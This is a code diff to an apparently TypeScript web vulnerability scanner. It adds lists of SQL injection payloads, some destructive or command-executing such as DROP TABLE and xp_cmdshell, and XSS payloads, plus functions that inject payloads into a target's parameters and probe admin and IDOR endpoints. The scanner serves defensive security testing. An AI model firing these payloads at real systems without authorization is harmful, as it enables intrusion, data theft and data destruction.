@@ -12,7 +12,7 @@ const SECURITY_HEADERS = [
   'Permissions-Policy'
 ]
 
-// Advanced SQL Injection test payloads
+// Advanced SQL Injection test payloads - MAKSIMAL
 const SQL_PAYLOADS = [
   "' OR '1'='1",
   "admin'--",
@@ -25,10 +25,29 @@ const SQL_PAYLOADS = [
   "1' WAITFOR DELAY '0:0:5'--",
   "1' AND SLEEP(5)--",
   "'; DROP TABLE users--",
-  "' OR EXISTS(SELECT * FROM users)--"
+  "' OR EXISTS(SELECT * FROM users)--",
+  "1' ORDER BY 1--",
+  "1' ORDER BY 2--",
+  "1' ORDER BY 3--",
+  "' HAVING 1=1--",
+  "' GROUP BY columnnames HAVING 1=1--",
+  "admin' AND 1=0 UNION ALL SELECT NULL, NULL, NULL--",
+  "' UNION SELECT user, password FROM users--",
+  "1' AND extractvalue(1,concat(0x7e,version()))--",
+  "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+  "'; EXEC xp_cmdshell('dir')--",
+  "' UNION SELECT NULL, table_name FROM information_schema.tables--",
+  "' AND 1=2 UNION SELECT NULL, column_name FROM information_schema.columns--",
+  "admin' OR '1'='1' #",
+  "1' AND CHAR(124)+CHAR(124)+1--",
+  "' OR 'x'='x",
+  "') OR ('1'='1",
+  "' OR username LIKE '%",
+  "' AND password LIKE '%",
+  "1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL--"
 ]
 
-// Advanced XSS test payloads
+// Advanced XSS test payloads - MAKSIMAL
 const XSS_PAYLOADS = [
   "<script>alert('XSS')</script>",
   "<img src=x onerror=alert(1)>",
@@ -43,7 +62,30 @@ const XSS_PAYLOADS = [
   "\"><script>alert(1)</script>",
   "';alert(String.fromCharCode(88,83,83))//",
   "<img src=x:alert(1) onerror=eval(src)>",
-  "<svg><script>alert(1)</script></svg>"
+  "<svg><script>alert(1)</script></svg>",
+  "<img src=x onerror=prompt(1)>",
+  "<img src=x onerror=confirm(1)>",
+  "<img src=x onerror=javascript:alert(1)>",
+  "<svg onload=alert(document.domain)>",
+  "<iframe srcdoc='<script>alert(1)</script>'>",
+  "<object data='javascript:alert(1)'>",
+  "<embed src='javascript:alert(1)'>",
+  "<form action='javascript:alert(1)'><input type=submit>",
+  "<input type='text' value='' onfocus='alert(1)' autofocus>",
+  "<select onfocus=alert(1) autofocus><option>",
+  "<textarea onfocus=alert(1) autofocus>",
+  "<keygen onfocus=alert(1) autofocus>",
+  "<video><source onerror=alert(1)>",
+  "<audio src=x onerror=alert(1)>",
+  "<style>@import'javascript:alert(1)';</style>",
+  "<link rel=stylesheet href='javascript:alert(1)'>",
+  "<base href='javascript:alert(1)//'>",
+  "<isindex type=submit value=click onfocus=alert(1)>",
+  "'-alert(1)-'",
+  "\"-alert(1)-\"",
+  "</script><script>alert(1)</script>",
+  "<img src=x:alert(1) onerror=eval(src) />",
+  "<svg><animate onbegin=alert(1) attributeName=x dur=1s>"
 ]
 
 // Path Traversal payloads
@@ -91,6 +133,36 @@ const VULNERABLE_FILES = [
   "package.json",
   ".npmrc",
   ".dockerenv"
+]
+
+// File Upload dangerous extensions
+const DANGEROUS_FILE_EXTENSIONS = [
+  '.php', '.php3', '.php4', '.php5', '.phtml',
+  '.asp', '.aspx', '.jsp', '.jspx',
+  '.exe', '.bat', '.cmd', '.sh',
+  '.py', '.rb', '.pl',
+  '.svg', '.xml',
+  '.html', '.htm'
+]
+
+// Access Control test endpoints
+const ACCESS_CONTROL_ENDPOINTS = [
+  '/admin',
+  '/admin/dashboard',
+  '/admin/users',
+  '/administrator',
+  '/dashboard',
+  '/user/profile',
+  '/api/admin',
+  '/api/users',
+  '/api/user/1',
+  '/api/user/2',
+  '/.git/config',
+  '/backup',
+  '/config',
+  '/wp-admin',
+  '/phpmyadmin',
+  '/adminer.php'
 ]
 
 export async function POST(request: NextRequest) {
@@ -248,6 +320,362 @@ async function checkSensitiveFiles(baseUrl: URL): Promise<any[]> {
   return findings
 }
 
+// MAKSIMAL: Test SQL Injection vulnerability
+async function testSQLInjection(baseUrl: URL, html: string): Promise<any[]> {
+  const findings: any[] = []
+  
+  // 1. Check for SQL error messages in response
+  const sqlErrors = [
+    'sql syntax', 'mysql', 'mysqli', 'pg_query', 'sqlite', 'odbc',
+    'you have an error in your sql syntax',
+    'warning: mysql',
+    'unclosed quotation mark',
+    'quoted string not properly terminated',
+    'ora-01756',
+    'sqlstate',
+    'syntax error or access violation',
+    'postgresql query failed',
+    'unterminated string literal'
+  ]
+  
+  const htmlLower = html.toLowerCase()
+  for (const error of sqlErrors) {
+    if (htmlLower.includes(error)) {
+      findings.push({
+        type: 'SQL Injection - Error Disclosure',
+        severity: 'critical',
+        description: `SQL error message detected: "${error}"`,
+        recommendation: 'Disable detailed error messages in production and use parameterized queries',
+        evidence: error
+      })
+      break
+    }
+  }
+  
+  // 2. Test GET parameters with SQL payloads
+  const urlParams = new URLSearchParams(baseUrl.search)
+  if (urlParams.toString()) {
+    for (const [key, value] of urlParams.entries()) {
+      // Test with a simple SQL payload
+      try {
+        const testUrl = new URL(baseUrl.toString())
+        testUrl.searchParams.set(key, "' OR '1'='1")
+        
+        const response = await fetch(testUrl.toString(), {
+          signal: AbortSignal.timeout(5000)
+        })
+        
+        const testHtml = await response.text()
+        const testHtmlLower = testHtml.toLowerCase()
+        
+        // Check if SQL errors appear after injection
+        for (const error of sqlErrors) {
+          if (testHtmlLower.includes(error)) {
+            findings.push({
+              type: 'SQL Injection Vulnerability',
+              severity: 'critical',
+              description: `Parameter "${key}" is vulnerable to SQL injection`,
+              recommendation: 'Use parameterized queries/prepared statements to prevent SQL injection',
+              evidence: `Payload: ' OR '1'='1 triggered SQL error`,
+              url: testUrl.toString()
+            })
+            break
+          }
+        }
+        
+        // Check for unusual response patterns
+        if (testHtml.length > html.length * 1.5 || testHtml.length < html.length * 0.5) {
+          findings.push({
+            type: 'Potential SQL Injection',
+            severity: 'high',
+            description: `Parameter "${key}" shows abnormal behavior with SQL payloads`,
+            recommendation: 'Review input validation and use prepared statements',
+            evidence: 'Response size changed significantly with SQL payload'
+          })
+        }
+      } catch {
+        // Error during test
+      }
+    }
+  }
+  
+  return findings
+}
+
+// MAKSIMAL: Test XSS vulnerability
+async function testXSS(baseUrl: URL, html: string): Promise<any[]> {
+  const findings: any[] = []
+  
+  // 1. Check for reflected input without sanitization
+  const urlParams = new URLSearchParams(baseUrl.search)
+  
+  // 2. Find forms in HTML
+  const formRegex = /<form[^>]*>([\s\S]*?)<\/form>/gi
+  const forms = html.match(formRegex) || []
+  
+  if (forms.length > 0) {
+    findings.push({
+      type: 'Forms Detected - Potential XSS Target',
+      severity: 'medium',
+      description: `Found ${forms.length} form(s) that could be vulnerable to XSS`,
+      recommendation: 'Implement input sanitization and output encoding',
+      evidence: `${forms.length} forms found`
+    })
+  }
+  
+  // 3. Check for dangerous HTML patterns
+  const dangerousPatterns = [
+    'eval\\(',
+    'innerHTML',
+    'document\\.write',
+    'document\\.writeln',
+    'dangerouslySetInnerHTML',
+    '\\.html\\(',
+    'v-html',
+    'onclick=',
+    'onerror=',
+    'onload='
+  ]
+  
+  for (const pattern of dangerousPatterns) {
+    const regex = new RegExp(pattern, 'gi')
+    if (regex.test(html)) {
+      findings.push({
+        type: 'XSS Risk - Dangerous Pattern',
+        severity: 'high',
+        description: `Found dangerous pattern: ${pattern}`,
+        recommendation: 'Avoid using dangerous JavaScript patterns, use safe DOM manipulation',
+        evidence: pattern
+      })
+    }
+  }
+  
+  // 4. Test GET parameters with XSS payloads
+  if (urlParams.toString()) {
+    for (const [key, value] of urlParams.entries()) {
+      try {
+        const testPayload = "<script>alert('XSS')</script>"
+        const testUrl = new URL(baseUrl.toString())
+        testUrl.searchParams.set(key, testPayload)
+        
+        const response = await fetch(testUrl.toString(), {
+          signal: AbortSignal.timeout(5000)
+        })
+        
+        const testHtml = await response.text()
+        
+        // Check if payload is reflected without encoding
+        if (testHtml.includes(testPayload)) {
+          findings.push({
+            type: 'Reflected XSS Vulnerability',
+            severity: 'critical',
+            description: `Parameter "${key}" is vulnerable to reflected XSS`,
+            recommendation: 'Sanitize and encode all user input before rendering',
+            evidence: 'XSS payload reflected without encoding',
+            url: testUrl.toString()
+          })
+        } else if (testHtml.includes('alert') || testHtml.includes('<script')) {
+          findings.push({
+            type: 'Potential XSS Vulnerability',
+            severity: 'high',
+            description: `Parameter "${key}" may be vulnerable to XSS (partial reflection)`,
+            recommendation: 'Implement proper input validation and output encoding',
+            evidence: 'Partial XSS payload detected in response'
+          })
+        }
+      } catch {
+        // Error during test
+      }
+    }
+  }
+  
+  // 5. Check Content-Type header
+  return findings
+}
+
+// MAKSIMAL: Test File Upload vulnerability
+async function testFileUpload(baseUrl: URL, html: string): Promise<any[]> {
+  const findings: any[] = []
+  
+  // 1. Find file upload forms
+  const fileInputRegex = /<input[^>]*type\s*=\s*["']?file["']?[^>]*>/gi
+  const fileInputs = html.match(fileInputRegex) || []
+  
+  if (fileInputs.length > 0) {
+    findings.push({
+      type: 'File Upload Detected',
+      severity: 'medium',
+      description: `Found ${fileInputs.length} file upload form(s)`,
+      recommendation: 'Implement strict file type validation, file size limits, and secure file storage',
+      evidence: `${fileInputs.length} file input fields found`
+    })
+    
+    // 2. Check if upload form has validation
+    const hasAcceptAttribute = fileInputs.some(input => input.includes('accept='))
+    if (!hasAcceptAttribute) {
+      findings.push({
+        type: 'Unrestricted File Upload Risk',
+        severity: 'high',
+        description: 'File upload form without client-side validation detected',
+        recommendation: 'Add "accept" attribute and implement server-side validation for allowed file types',
+        evidence: 'No accept attribute found in file inputs'
+      })
+    }
+    
+    // 3. Check for dangerous file extension warnings
+    findings.push({
+      type: 'File Upload Security Recommendations',
+      severity: 'medium',
+      description: 'File upload requires comprehensive security measures',
+      recommendation: [
+        'Validate file types on server-side (whitelist approach)',
+        'Scan uploaded files for malware',
+        'Store files outside web root',
+        'Rename uploaded files',
+        'Limit file size',
+        `Block dangerous extensions: ${DANGEROUS_FILE_EXTENSIONS.join(', ')}`,
+        'Use Content-Type validation',
+        'Implement rate limiting'
+      ].join('; ')
+    })
+  }
+  
+  // 4. Check for common upload endpoints
+  const uploadEndpoints = ['/upload', '/file-upload', '/api/upload', '/uploader']
+  for (const endpoint of uploadEndpoints) {
+    try {
+      const testUrl = new URL(endpoint, baseUrl.toString())
+      const response = await fetch(testUrl.toString(), {
+        method: 'OPTIONS',
+        signal: AbortSignal.timeout(3000)
+      })
+      
+      if (response.ok) {
+        const allowHeader = response.headers.get('allow') || ''
+        if (allowHeader.includes('POST')) {
+          findings.push({
+            type: 'Upload Endpoint Detected',
+            severity: 'medium',
+            description: `Upload endpoint found: ${endpoint}`,
+            recommendation: 'Ensure upload endpoint has proper authentication and validation',
+            url: testUrl.toString()
+          })
+        }
+      }
+    } catch {
+      // Endpoint not accessible
+    }
+  }
+  
+  return findings
+}
+
+// MAKSIMAL: Test Broken Access Control
+async function testAccessControl(baseUrl: URL): Promise<any[]> {
+  const findings: any[] = []
+  
+  // 1. Test common admin/sensitive endpoints
+  for (const endpoint of ACCESS_CONTROL_ENDPOINTS) {
+    try {
+      const testUrl = new URL(endpoint, baseUrl.toString())
+      
+      // Test WITHOUT authentication
+      const response = await fetch(testUrl.toString(), {
+        method: 'GET',
+        redirect: 'manual',
+        signal: AbortSignal.timeout(5000)
+      })
+      
+      // If we get 200 OK without auth, it's a problem
+      if (response.status === 200) {
+        findings.push({
+          type: 'Broken Access Control - Unauthorized Access',
+          severity: 'critical',
+          description: `Sensitive endpoint "${endpoint}" is publicly accessible`,
+          recommendation: 'Implement proper authentication and authorization checks',
+          url: testUrl.toString(),
+          evidence: 'HTTP 200 returned without authentication'
+        })
+      }
+      
+      // If we get 403 Forbidden, access control exists (good)
+      // If we get 401 Unauthorized, authentication is required (good)
+      // If we get 404, endpoint doesn't exist (neutral)
+      
+    } catch {
+      // Error during test
+    }
+  }
+  
+  // 2. Test IDOR (Insecure Direct Object Reference)
+  const idorEndpoints = [
+    '/api/user/1',
+    '/api/user/2',
+    '/user/profile/1',
+    '/document/1',
+    '/file/1'
+  ]
+  
+  for (const endpoint of idorEndpoints) {
+    try {
+      const testUrl = new URL(endpoint, baseUrl.toString())
+      const response = await fetch(testUrl.toString(), {
+        signal: AbortSignal.timeout(5000)
+      })
+      
+      if (response.status === 200) {
+        findings.push({
+          type: 'Potential IDOR Vulnerability',
+          severity: 'high',
+          description: `Endpoint "${endpoint}" may be vulnerable to IDOR attacks`,
+          recommendation: 'Implement proper authorization checks to verify user owns the resource',
+          url: testUrl.toString(),
+          evidence: 'Sequential ID accessible without proper authorization check'
+        })
+      }
+    } catch {
+      // Error during test
+    }
+  }
+  
+  // 3. Check for exposed admin interfaces
+  const adminInterfaces = [
+    '/admin',
+    '/administrator',
+    '/wp-admin',
+    '/phpmyadmin',
+    '/adminer',
+    '/admin.php',
+    '/administrator.php',
+    '/cpanel',
+    '/plesk'
+  ]
+  
+  for (const admin of adminInterfaces) {
+    try {
+      const testUrl = new URL(admin, baseUrl.toString())
+      const response = await fetch(testUrl.toString(), {
+        method: 'HEAD',
+        signal: AbortSignal.timeout(3000)
+      })
+      
+      if (response.status === 200 || response.status === 302) {
+        findings.push({
+          type: 'Exposed Admin Interface',
+          severity: 'high',
+          description: `Admin interface found at: ${admin}`,
+          recommendation: 'Restrict admin interface access by IP whitelist or VPN, use strong authentication',
+          url: testUrl.toString()
+        })
+      }
+    } catch {
+      // Interface not accessible
+    }
+  }
+  
+  return findings
+}
+
 // Advanced subdomain detection
 async function findSubdomains(domain: string): Promise<string[]> {
   const subdomains = ['www', 'api', 'admin', 'dev', 'staging', 'test', 'mail', 'ftp', 'blog', 'shop']
@@ -349,23 +777,52 @@ async function performScan(scanId: string, url: URL, scanType: string) {
         })
       }
 
-      // Check for SQL error messages (potential SQL injection)
-      const sqlErrors = ['sql syntax', 'mysql_fetch', 'pg_query', 'sqlite_query', 'odbc_exec']
-      results.checks.total++
-      for (const error of sqlErrors) {
-        if (html.toLowerCase().includes(error)) {
-          results.checks.failed++
-          results.vulnerabilities.push({
-            type: 'SQL Injection - Error Disclosure',
-            severity: 'critical',
-            description: 'SQL error messages exposed in response',
-            recommendation: 'Disable detailed error messages in production'
-          })
-          break
-        }
+      // ===== MAKSIMAL TESTING STARTS HERE =====
+      
+      // 1. SQL INJECTION TESTING
+      console.log('🔍 Testing SQL Injection...')
+      const sqlFindings = await testSQLInjection(url, html)
+      results.vulnerabilities.push(...sqlFindings)
+      results.checks.total += 5
+      if (sqlFindings.length > 0) {
+        results.checks.failed += sqlFindings.length
+      } else {
+        results.checks.passed += 5
       }
-      if (!results.vulnerabilities.some((v: any) => v.type.includes('SQL'))) {
-        results.checks.passed++
+      
+      // 2. XSS TESTING
+      console.log('🔍 Testing XSS...')
+      const xssFindings = await testXSS(url, html)
+      results.vulnerabilities.push(...xssFindings)
+      results.checks.total += 5
+      if (xssFindings.length > 0) {
+        results.checks.failed += xssFindings.length
+      } else {
+        results.checks.passed += 5
+      }
+      
+      // 3. FILE UPLOAD TESTING
+      console.log('🔍 Testing File Upload...')
+      const uploadFindings = await testFileUpload(url, html)
+      results.vulnerabilities.push(...uploadFindings)
+      results.checks.total += 3
+      if (uploadFindings.length > 0) {
+        results.checks.failed += uploadFindings.length
+      } else {
+        results.checks.passed += 3
+      }
+      
+      // 4. BROKEN ACCESS CONTROL TESTING
+      if (scanType === 'full') {
+        console.log('🔍 Testing Access Control...')
+        const accessFindings = await testAccessControl(url)
+        results.vulnerabilities.push(...accessFindings)
+        results.checks.total += 10
+        if (accessFindings.length > 0) {
+          results.checks.failed += accessFindings.length
+        } else {
+          results.checks.passed += 10
+        }
       }
 
       // Check for exposed sensitive info
